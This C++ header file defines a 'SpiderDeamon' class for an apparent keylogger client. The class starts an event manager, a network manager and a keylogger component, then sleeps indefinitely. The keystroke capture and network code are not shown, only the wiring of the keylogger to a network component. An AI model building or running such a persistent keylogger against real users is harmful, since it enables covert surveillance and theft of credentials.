//
// Created by etiennep on 11/8/16.
//

#ifndef SPIDER_CLIENT_SPIDERDEAMON_HPP
#define SPIDER_CLIENT_SPIDERDEAMON_HPP

#include <memory>
#include <thread>
#include "ISpiderDeamon.hpp"
#include "ISpiderNetworkManager.hpp"
#include "SpiderNetworkManager.hpp"
#include "ISpiderKeyLogger.hpp"
#include "SpiderKeyLogger.hpp"
#include "SpiderEventManager.hpp"

class SpiderDeamon : public ISpiderDeamon {
private:
	std::unique_ptr<ISpiderKeyLogger> KeyLogger = std::unique_ptr<ISpiderKeyLogger>(std::make_unique<SpiderKeyLogger>());
	std::unique_ptr<ISpiderNetworkManager> NetworkManager = std::unique_ptr<ISpiderNetworkManager>(std::make_unique<SpiderNetworkManager>());
	std::unique_ptr<ISpiderEventManager> EventManager = std::unique_ptr<ISpiderEventManager>(std::make_unique<SpiderEventManager>());

public:
	void Run() override final {
		EventManager->Run();
		NetworkManager->Run();
		KeyLogger->Run();

		//Let's wait indefinitely
		std::this_thread::sleep_until(std::chrono::system_clock::now() + std::chrono::hours(std::numeric_limits<int>::max()));
	}
};

#endif //SPIDER_CLIENT_SPIDERDEAMON_HPP